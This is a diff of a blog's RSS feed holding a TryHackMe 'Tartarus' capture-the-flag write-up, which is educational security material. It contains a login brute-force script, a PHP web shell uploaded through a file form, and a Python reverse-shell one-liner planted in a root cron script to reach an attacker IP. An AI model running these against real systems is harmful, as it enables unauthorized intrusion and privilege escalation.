@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[hatecomputers.club]]></title><description><![CDATA[Blog primarily about infosec and some random thoughts.]]></description><link>https://gatsby-starter-blog-demo.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Sun, 03 Jan 2021 23:00:10 GMT</lastBuildDate><item><title><![CDATA[TryHackMe - Tartarus CTF Writeup]]></title><description><![CDATA[This is my first TryHackMe writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado…]]></description><link>https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</link><guid isPermaLink="false">https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</guid><pubDate>Sun, 01 Nov 2020 22:12:03 GMT</pubDate><content:encoded>&lt;p&gt;This is my first &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado, lets get to it.   &lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[hatecomputers.club]]></title><description><![CDATA[Blog primarily about infosec and some random thoughts.]]></description><link>https://gatsby-starter-blog-demo.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Mon, 04 Jan 2021 09:33:10 GMT</lastBuildDate><item><title><![CDATA[TryHackMe - Tartarus CTF Writeup]]></title><description><![CDATA[This is my first TryHackMe writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado…]]></description><link>https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</link><guid isPermaLink="false">https://gatsby-starter-blog-demo.netlify.app/try-hack-me-tartarus/</guid><pubDate>Sun, 01 Nov 2020 22:12:03 GMT</pubDate><content:encoded>&lt;p&gt;This is my first &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; writeup. Tartarus was flagged as na easy machine and took me around 2 hours to get the root. Without further ado, lets get to it.   &lt;/p&gt;
 &lt;h2&gt;Enumeration&lt;/h2&gt;
 &lt;p&gt;I like to start it off by quickly checking whats in front of me. &lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt; can help with that. My &lt;em&gt;go-to&lt;/em&gt; approach is usually:&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;P.S: Quick heads up: There will be command breakdown in the end of every article so you can use for future reference. For now, just bear with me.&lt;/em&gt;  &lt;/p&gt;
@@ -37,10 +37,10 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Ok, as you can see nmap has replied with 3 open ports being 21 (&lt;strong&gt;ftp&lt;/strong&gt;), 22 (&lt;strong&gt;ssh&lt;/strong&gt;) and 80 (&lt;strong&gt;http&lt;/strong&gt;). Also, because we took advantage of &lt;a href=&quot;&quot;&gt;nmap-scripts&lt;/a&gt;, we were able to get some additional juice, showing that FTP is allowing &lt;strong&gt;anonymous&lt;/strong&gt; login and also that is hosting a file called &lt;strong&gt;test.txt&lt;/strong&gt; which might be contain interesting information. &lt;/p&gt;
+&lt;p&gt;Ok, as you can see nmap has replied with 3 open ports being 21 (&lt;strong&gt;ftp&lt;/strong&gt;), 22 (&lt;strong&gt;ssh&lt;/strong&gt;) and 80 (&lt;strong&gt;http&lt;/strong&gt;). Also, because we took advantage of &lt;a href=&quot;https://nmap.org/book/nse-usage.html&quot;&gt;nmap-scripts&lt;/a&gt;, we were able to get some additional juice, showing that FTP is allowing &lt;strong&gt;anonymous login&lt;/strong&gt; and also that it is hosting a file called &lt;strong&gt;test.txt&lt;/strong&gt;, which might contain interesting information. &lt;/p&gt;
 &lt;p&gt;In parallel while I poke around, I usually like having nmap doing a full scan on background:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nmap -Pn -p- tartarus.htm | tee -a nmap-all-ports&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The reason for doing this wasn’t so much about finding exploitable versions but basically to understand whether there was some hidden gems running on any custom ports I should’ve know of. That wasn’t the case. &lt;/p&gt;
+&lt;p&gt;The reason for doing this wasn’t so much about finding exploitable applications but basically to understand whether I should also expand my attention to any available custom ports. That wasn’t the case. &lt;/p&gt;
 &lt;h3&gt;FTP (21) - Part I&lt;/h3&gt;
 &lt;p&gt;In the meantime, I logged myself on the FTP server and grabbed the &lt;strong&gt;test.txt&lt;/strong&gt; file. As you know by now, anonymous login was allowed:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Name (tartarus.thm:hatecomputers): anonymous
@@ -67,7 +67,7 @@ ftp&amp;gt; exit
 vsftpd test file&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Which wasn’t necessarily useful. &lt;/p&gt;
 &lt;h3&gt;Web (80) - Part I&lt;/h3&gt;
-&lt;p&gt;I decided then to run &lt;code class=&quot;language-text&quot;&gt;curl&lt;/code&gt; against the host, looking for any possible leaks. Performing a simple &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; request gave me this:&lt;/p&gt;
+&lt;p&gt;I decided then, to run &lt;strong&gt;cURL&lt;/strong&gt; against the host looking for any possible leaks. Performing a simple &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; request returned me this:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -s -i tartarus.thm
 
 HTTP/1.1 200 OK
@@ -121,8 +121,7 @@ d&amp;quot;&amp;gt;
       /&gt;
   &lt;/a&gt;
     &lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;Not very useful either, although default versions usually mean default configurations - and default passwords. Running &lt;code class=&quot;language-text&quot;&gt;Gobuster&lt;/code&gt; was next logical step:&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;P.S: If you yet don’t have &lt;strong&gt;SecList&lt;/strong&gt; as part of your current workflow, make sure to grab it &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;here&lt;/a&gt;. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under &lt;strong&gt;/usr/share/&lt;/strong&gt; directory.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Not very useful either, although default versions usually mean default configurations - and default passwords if there are any places to log us in. Running &lt;code class=&quot;language-text&quot;&gt;Gobuster&lt;/code&gt; was next logical step:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ gobuster dir -u http://tartarus.thm -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 20
 ===============================================================
 Gobuster v3.0.1
@@ -141,10 +140,11 @@ by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/09/28 09:16:08 Finished
 ===============================================================&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Also found “nothing”. &lt;strong&gt;/server-status&lt;/strong&gt; was available but forbidden. Worth pointing out I was starting to feel a little anxious already given this machine was flagged as easy but so far I hadn’t found anything. Shamelessly, I decided to run &lt;code class=&quot;language-text&quot;&gt;searchsploit&lt;/code&gt; expecting to shed some light and yet, nothing. Took a quick break expecting to have some insights. It worked.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;P.S: If you yet don’t have &lt;strong&gt;SecList&lt;/strong&gt; as part of your current workflow, make sure to grab it &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;here&lt;/a&gt;. Or if you doing from kali linux, you can do the same by apt -y install seclists. This should be available under &lt;strong&gt;/usr/share/&lt;/strong&gt; directory.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Also couldn’t find anything useful. &lt;strong&gt;/server-status&lt;/strong&gt; was available but forbidden. Shamelessly then, I decided to run &lt;strong&gt;searchsploit&lt;/strong&gt; expecting to shed some light and yet, it seemed there was no available exploits for any of the running applications. Took a quick for a coffee and came back. It worked.&lt;/p&gt;
 &lt;p&gt;Turns out, I missed something quite obvious during my initial recon.&lt;/p&gt;
 &lt;h3&gt;FTP (21) - Part II&lt;/h3&gt;
-&lt;p&gt;I again log myself through FTP and this time took a better look around, this time not ignoring entries starting with &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; when listing the files:&lt;/p&gt;
+&lt;p&gt;I again got myself logged in on FTP but now looking more carefully at things:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; ls -al
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -153,7 +153,7 @@ by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
 -rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 ... 
 -rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
 226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;If you are slightly comfortable with *nix environments, you know that &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; means current directory, &lt;code class=&quot;language-text&quot;&gt;..&lt;/code&gt; means previous directory but &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; isn’t really a thing. So, someone named a directory &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; deliberately. Interesting. Let’s check what is inside: &lt;/p&gt;
+&lt;p&gt;If you are slightly comfortable with *nix environments, you know that &lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt; alone means current directory, &lt;code class=&quot;language-text&quot;&gt;..&lt;/code&gt; means previous directory but &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt; isn’t really a thing. So, someone deliberately named a directory &lt;code class=&quot;language-text&quot;&gt;...&lt;/code&gt;. Interesting. Let’s have a look: &lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ftp&amp;gt; cd ...
 200 PORT command successful. Consider using PASV.
 ftp&amp;gt; ls -al
@@ -162,16 +162,16 @@ ftp&amp;gt; ls -al
 ftp&amp;gt; get yougotgoodeyes.txt
 150 Here comes the directory listing.
 226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;So there was indeed, a different file and the content was just &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt;. Judging by the forward slash prefix, it stroke me as a potential web directory. I was right. Time to give the http server a go again.&lt;/p&gt;
+&lt;p&gt;So there was indeed, a different file and the content was just &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt;. Judging by the forward slash prefix, it stroke me as a potential web directory. It was. Time to give the http server a go again.&lt;/p&gt;
 &lt;h3&gt;Web (80) - Part II&lt;/h3&gt;
-&lt;p&gt;Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. Gobuster was already running in background and found a directory called &lt;strong&gt;/images&lt;/strong&gt; (I’ve ran the same Gobuster as the one above but adding the /sUp3r-s3cr3t at the end of the url), which I couldn’t access.&lt;/p&gt;
-&lt;p&gt;Also, while thinking about it, I previously assumed - &lt;strong&gt;n00b mistake&lt;/strong&gt; - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found &lt;strong&gt;/robots.txt&lt;/strong&gt; was available, giving away a pretty important piece of information:&lt;/p&gt;
+&lt;p&gt;Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. &lt;strong&gt;Gobuster&lt;/strong&gt; was already running in background and found a directory called &lt;strong&gt;/images&lt;/strong&gt; (I’ve ran the same &lt;strong&gt;Gobuster&lt;/strong&gt; as the one above but adding the &lt;strong&gt;/sUp3r-s3cr3t&lt;/strong&gt; at the end of the url), which I couldn’t access.&lt;/p&gt;
+&lt;p&gt;Also, while initially poking around, I assumed - &lt;strong&gt;n00b mistake&lt;/strong&gt; - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found out that &lt;strong&gt;/robots.txt&lt;/strong&gt; was available, giving away a pretty important piece of information:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;User-Agent: *
 Disallow: /admin-dir
 
 I told d4rckh we should hide our things deep&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;This led me to a open directory where I found two files: &lt;strong&gt;credentials.txt&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt;. Both files contained what appeared to be a list of passwords and usernames.&lt;/p&gt;
-&lt;p&gt;After investing some time trying to sort it out &lt;code class=&quot;language-text&quot;&gt;Hydra&lt;/code&gt;’s terrible syntax that led me nowhere but frustration town, I decided to brute force my way in, scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:&lt;/p&gt;
+&lt;p&gt;This led me to a open directory where I also found two files: &lt;strong&gt;credentials.txt&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt;. Both files contained what appeared to be a list of passwords and usernames.&lt;/p&gt;
+&lt;p&gt;After investing some time trying to sort out &lt;code class=&quot;language-text&quot;&gt;Hydra&lt;/code&gt;’s terrible syntax that led me nowhere, out of frustration I decided to brute force my way in scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/python3
 
 import requests;                                                                                    
@@ -205,14 +205,14 @@ for passwd in passwords:
     if response.status_code == 200 and response.text != &amp;#39;Incorrect password!&amp;#39;:
         print(f&amp;#39;password {passwd}&amp;#39;)
         break&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through the both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  &lt;/p&gt;
-&lt;p&gt;Combining that woth both &lt;strong&gt;credentials&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt; wordlists, I managed to find the user and password necessary (&lt;strong&gt;enox:P@ssword1234&lt;/strong&gt;) so I could log in, which presented me with a “Upload your file” kind of page.&lt;/p&gt;
+&lt;p&gt;The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.  &lt;/p&gt;
+&lt;p&gt;Combining that with both &lt;strong&gt;credentials&lt;/strong&gt; and &lt;strong&gt;userid&lt;/strong&gt; wordlists, I managed to find the user and password necessary (&lt;strong&gt;enox:P@ssword1234&lt;/strong&gt;) so I could log in, which presented me with a “Upload your file” kind of page.&lt;/p&gt;
 &lt;h3&gt;Getting a shell + user flag&lt;/h3&gt;
 &lt;p&gt;I immediately created a simple php file with this and send it over: &lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
 system($_GET[&amp;#39;cmd&amp;#39;])
 ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;I could go for the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentest monkey php reverse shell&lt;/a&gt; but I usually try to make things as simple as I can. This gives me everything I need: &lt;code class=&quot;language-text&quot;&gt;system&lt;/code&gt; function executes whenever command I would passed in, while the &lt;code class=&quot;language-text&quot;&gt;$_GET[&amp;#39;cmd&amp;#39;]&lt;/code&gt; is a  request param I’ve sent (which I named &lt;strong&gt;cmd&lt;/strong&gt;). &lt;/p&gt;
+&lt;p&gt;I could’ve gone for the &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentest monkey php reverse shell&lt;/a&gt; but I usually try to make things as simple as I can. And honestly, this gives me everything I need: &lt;code class=&quot;language-text&quot;&gt;system&lt;/code&gt; function executes whenever command I would passed in, while the &lt;code class=&quot;language-text&quot;&gt;$_GET[&amp;#39;cmd&amp;#39;]&lt;/code&gt; is a request param I’ve sent (which I named &lt;strong&gt;cmd&lt;/strong&gt;). &lt;/p&gt;
 &lt;p&gt;Then I open up &lt;strong&gt;Burpsuite&lt;/strong&gt;, went to directory where my php script landed. &lt;/p&gt;
 &lt;p&gt;&lt;span
       class=&quot;gatsby-resp-image-wrapper&quot;
@@ -246,7 +246,7 @@ system($_GET[&amp;#39;cmd&amp;#39;])
       /&gt;
   &lt;/a&gt;
     &lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;Then, back to the terminal and I typed: &lt;/p&gt;
+&lt;p&gt;Then, back to the terminal I typed: &lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;And just waited. &lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4444
@@ -267,7 +267,7 @@ drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
 &lt;p&gt;This was enough to get user flag as you can see. Next, we move to privilege escalation. &lt;/p&gt;
 &lt;h3&gt;Privesc + root flag&lt;/h3&gt;
 &lt;p&gt;If you paid close attention to what was shown above, you noticed that along with the &lt;strong&gt;user.txt&lt;/strong&gt;,
-there’s a &lt;strong&gt;cleanup.py&lt;/strong&gt; script. You can tell it was originally created by the root but for whatever reason
+there’s was &lt;strong&gt;cleanup.py&lt;/strong&gt; script. You can tell it was originally created by the root but for whatever reason
 we have all the permissions (read, write and execution). A quick &lt;code class=&quot;language-text&quot;&gt;cat&lt;/code&gt; to reveal its content:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py                                                 
 #!/usr/bin/env python                                                                               
@@ -279,10 +279,10 @@ try:
         os.system(&amp;#39;rm -r /home/cleanup/* &amp;#39;)                                                         
 except:                                                                                             
         sys.exit()                      &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;It seems like its job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code on the top the script:&lt;/p&gt;
+&lt;p&gt;It seemed to me - and I guess this comes with a little bit of practice - like it was job (the kind of file that runs from time to time). I didn’t even check the cron jobs to see if there was something and just went with my gut. I then placed this piece of code I took from &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;here&lt;/a&gt; on the top the script:&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.9.84.24&amp;quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bi
 n/sh&amp;quot;,&amp;quot;-i&amp;quot;]);   &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;and again, waited (this time listening to the port &lt;strong&gt;4445&lt;/strong&gt;). And after a minute or two(?):&lt;/p&gt;
+&lt;p&gt;and again, waited (this time listening to the port &lt;strong&gt;4445&lt;/strong&gt; however). After a minute or two(?):&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ nc -vlp 4445
 $ id                                
 id=0(root) gid=0(root) groups=0(root)
